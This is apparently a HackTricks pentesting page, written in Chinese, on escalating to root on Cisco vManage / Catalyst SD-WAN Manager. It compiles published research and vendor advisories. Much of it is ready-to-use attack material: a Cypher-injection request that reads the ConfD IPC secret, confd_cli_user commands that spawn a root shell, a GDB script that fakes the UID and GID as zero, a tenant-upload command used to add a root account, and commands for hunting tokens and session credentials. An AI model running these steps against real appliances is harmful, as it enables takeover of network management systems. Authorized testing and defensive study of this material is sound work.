# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

在 Cisco vManage / *Catalyst SD-WAN Manager* 上以 `vmanage`、`netadmin` 或 `vmanage-admin` 身份获得代码执行后，最值得关注的本地 privesc 攻击面通常是 `confd` CLI stack、`cmdptywrapper` helper、localhost REST APIs，以及由 root 所有的 import/upload handlers。

如果你仍需要在 controller 上取得 **initial foothold**，请先查看专门的 control-plane 页面：

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
如果从你的 foothold 可以读取 `/etc/confd/confd_ipc_secret`，Path 1 和 Path 2 就能立即实际利用。如果你是通过 remote file disclosure 或 webshell 进入的，还应检查 `vmanage-admin` 的 SSH material 和 multitenancy upload handlers；近期研究证明，这两者都可以作为可行的 pivot。<sup>[[3]](#references)[[4]](#references)</sup>

## Path 1

Synacktiv 的 vManage assessment 记录了这条 root-shell path。<sup>[[5]](#references)</sup>

报告链接的 [ConfD documentation](http://66.218.245.39/doc/html/rn03re18.html) 描述了 IPC authentication；其中的 vManage 示例将 secret 放置在 `/etc/confd/confd_ipc_secret`，并显示该文件可由 `vmanage` 读取。<sup>[[5]](#references)</sup>
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
由于 Neo4j 在报告的配置中以 `vmanage` 权限运行，前述 Cypher injection 可以读取 secret file。<sup>[[5]](#references)</sup>
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` 本身不接受命令行参数；它会调用 `/usr/bin/confd_cli_user`。报告中的工作流程会从 rootfs 中提取该 root 可读的 helper，通过 `scp` 复制它，读取其 help，设置 `CONFD_IPC_ACCESS_FILE`，并使用 `-U 0 -G 0` 调用它以获取 root shell。<sup>[[5]](#references)</sup>
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## 路径 2

这条替代路径改编自 Walmart Global Tech 对 vManage 19.2.2 的研究。<sup>[[6]](#references)</sup>

Synacktiv 路径需要一份 `/usr/bin/confd_cli_user` 的副本，在报告的环境中该文件对 root 可读；而 Walmart 报告则在 GDB 下修改 `confd_cli` 的身份值。<sup>[[5]](#references)[[6]](#references)</sup>

报告中的反汇编显示，`confd_cli` 正在收集调用者的 UID 和 GID。<sup>[[6]](#references)</sup>

<details>
<summary>显示 UID/GID 收集过程的 Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

同一测试显示，一个由 root 所有的 `cmdptywrapper` 接收了明确指定的 `-g` 和 `-u` 值。<sup>[[6]](#references)</sup>
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
研究人员推断，`confd_cli` 会将已登录用户的 UID 和 GID 转发给 `cmdptywrapper`。<sup>[[6]](#references)</sup>

直接使用 `-g 0 -u 0` 运行 `cmdptywrapper` 失败，因为所需的文件描述符（示例中的 `-i 1015`）不可用。<sup>[[6]](#references)</sup>

由于 `confd_cli` 不会将这些值作为参数暴露出来，该报告使用 GDB 覆盖 `getuid()` 和 `getgid()` 的返回值；该设备上存在 GDB。<sup>[[5]](#references)[[6]](#references)</sup>

通过 `vmanage` 访问权限，测试可以读取 `/etc/confd/confd_ipc_secret`；以下脚本会强制两个身份调用都返回零。<sup>[[6]](#references)</sup>

报告中使用的 GDB 脚本如下：<sup>[[6]](#references)</sup>
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
报告的 console output 如下：<sup>[[6]](#references)</sup>

<details>
<summary>Console output</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## 路径 3（2025 CLI 输入验证漏洞 - CVE-2025-20122）

Cisco 后来在其针对 [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) 的官方公告中记录了一条更简洁的本地 root 路径。一个**仅拥有只读权限的已认证攻击者**可以向 manager CLI 发送构造的请求，并因输入验证不足而获得 root 权限。<sup>[[7]](#references)</sup>

从攻击角度来看，该公告以及早期的 CLI 研究表明可以采用以下工作流。<sup>[[6]](#references)[[7]](#references)</sup>

1. 一旦在设备上获得*任何*低权限 foothold，应在执行更复杂的路径 1 / 路径 2 工作流之前，先测试本地 CLI service。
2. 重用路径 2 中的 artifacts，以查找 trust boundary：`confd_cli` → `cmdptywrapper` → `vshell`。
3. 将转发到 CLI backend 的每个字段都视为可疑项：UID/GID、username、terminal metadata、imported files，或任何随后会被 root-owned helper 使用的值。
4. 如果低权限用户能够访问本地 CLI socket 并影响这些字段，那么距离 root 可能只差一个构造的请求。

进入 appliance 后，按以下方式检查本地 CLI chain。<sup>[[6]](#references)[[7]](#references)</sup>
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
这将 2025 年的 bug 转化为一种可复用的 hunting pattern：寻找**在 userland 中收集身份信息并将其转发给 privileged wrapper 的本地 CLI shims**。<sup>[[6]](#references)[[7]](#references)</sup>

不要将 **CVE-2025-20122** 与后续的 **CVE-2026-20122** 混淆：2025 年的问题是一个 *local* CLI-to-root bug，而 2026 年的问题是一个 *remote* API arbitrary file overwrite，主要用于植入 foothold，然后重新检查 Path 1 / Path 2 / Path 4。<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4（2026 low-priv REST API to root - CVE-2026-20126）

Cisco 2026 年 2 月的 advisory 描述了另一类有用的 privesc，[CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)。由于 REST API 中存在不充分的 user-authentication mechanism，**经过身份验证的本地低权限 attacker** 可能获得 root 权限。<sup>[[1]](#references)</sup>

这很重要，因为 vManage privesc 不再局限于 `confd`/TTY abuse；获得 low-priv shell 后，还应继续 hunting 以下内容。<sup>[[1]](#references)</sup>

- 过度信任 caller 的 localhost-only API endpoints
- 当前账户可读取的 tokens、cookies 或 service credentials
- 通过 `dataservice`/REST handlers 暴露、且仍可在本地触发的 root-only actions

在实践中，一旦你获得了 `vmanage` 或其他 service user 的 shell，local API abuse 可能比交互式 CLI abuse 更容易自动化。<sup>[[1]](#references)</sup>
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
如果本地会话上下文足以访问特权 REST 功能，优先选择 API 路径：它更容易重放、编写脚本，并与被窃取的 Web 会话或 API tokens 链接使用。<sup>[[1]](#references)</sup>

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

另一个近期模式是 [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)。具有 `netadmin` 权限的本地攻击者可以上传一个**crafted file**，CLI 随后会以不安全的方式处理该文件，最终以 `root` 身份导致 command injection。<sup>[[2]](#references)</sup>

从 HackTricks 的角度看，有价值的 technique 不仅限于这个特定的 CVE。<sup>[[2]](#references)</sup>

1. 枚举所有接受文件的 CLI 或 Web 工作流：imports、diagnostic bundles、templates、validators、backups、tenant data 等。
2. 跟踪上传文件的落点，以及哪个 root-owned script 或 binary 会使用它。
3. 测试文件名、文件内容或解析后的 metadata 是否曾被传递给 shell commands、wrapper scripts 或 `system()`-style helpers。
4. 如果已经能够访问 `netadmin`（有效凭据、被窃取的会话或 auth-bypass chain），file-processing bugs 往往是获得 root 的最快路径。

Google Cloud / Mandiant 后来展示了此类 bug 通过 multitenancy import path 被利用的具体实例。<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
在观察到的攻击中，构造的 CSV 修改了 `/etc/passwd` 和 `/etc/shadow`，以创建一个临时的 UID 0 账户（`troot`）。这使得 `tenant-upload` / `tenant-list` 风格的导入器尤其值得关注：它们不仅是数据摄取功能，还可能是由 root 拥有的 parser 前端。<sup>[[4]](#references)</sup>

一个快速的 shell 端 hunting 模式是：
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
此类 bug 与授予 `netadmin` 但不授予 `root` 的 remote foothold 尤其适合进行 chain。<sup>[[2]](#references)[[4]](#references)</sup>

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **Unauthenticated info leak (CVE-2026-20133)** – 其价值尤其高，因为公开研究表明它可以暴露 `confd_ipc_secret` 或 `vmanage-admin` private key，将 read bug 转化为 Path 1 或 NETCONF pivot。<sup>[[3]](#references)</sup>
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – 与上文的 2025 CLI bug 不同；VulnCheck 利用它上传 webshell，随后本页面中的 local privesc paths 便立即适用。<sup>[[3]](#references)</sup>
- **Authenticated UI XSS (CVE-2024-20475)** – authenticated attacker 可以在受影响用户的 web interface 中执行 script；应评估由此产生的 session context 是否暴露能够到达 `vshell` 或上述某个 local privesc path 的 API/CLI actions。<sup>[[9]](#references)</sup>
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – 这是 Path 5 非常强的 precursor，因为 `netadmin` 正是 2026 crafted-file privesc 所需的权限级别。<sup>[[2]](#references)[[3]](#references)</sup>
- **Authenticated arbitrary file write (CVE-2026-20262)** – 其 offensive value 与 CVE-2026-20122 相近，但通过后续的 web UI upload path 实现；Cisco 表示，该 bug 创建或覆盖的文件之后可能被用于 elevate to root。<sup>[[10]](#references)</sup>
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – 2026 年的 intrusions 表明，attackers 可以回滚到较旧的 vulnerable SD-WAN build，滥用旧 CLI root bug，然后恢复原始版本。<sup>[[8]](#references)</sup>
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – 相关内容在专门的 SD-WAN control-plane 页面中有更详细的说明；它可以为 `vmanage-admin` 追加 SSH key，从而为后续 management-plane actions 提供持久的 NETCONF access。<sup>[[11]](#references)</sup>



## References

- [1] [Cisco Catalyst SD-WAN 漏洞 (CVE-2026-20126, CVE-2026-20129, 等)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Cisco Catalyst SD-WAN Controller、Catalyst SD-WAN Manager 和 Catalyst SD-WAN Validator authenticated privilege escalation 漏洞 (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck：Herding Cats - 近期 Cisco SD-WAN Manager 漏洞](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant：Cisco Catalyst SD-WAN Manager 中漏洞 (CVE-2026-20245) 的 zero-day exploitation](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN Part 1：Attacking vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 —— From CSRF to Remote Code Execution](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Cisco Catalyst SD-WAN Manager privilege escalation 漏洞 (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [UAT-8616 对 Cisco Catalyst SD-WAN 的 active exploitation (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Cisco Catalyst SD-WAN Manager cross-site scripting 漏洞 (CVE-2024-20475)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Cisco Catalyst SD-WAN Manager arbitrary file write 漏洞 (CVE-2026-20262)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7：CVE-2026-20182 - Cisco Catalyst SD-WAN Controller 中的 critical authentication bypass](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)
{{#include ../../banners/hacktricks-training.md}}
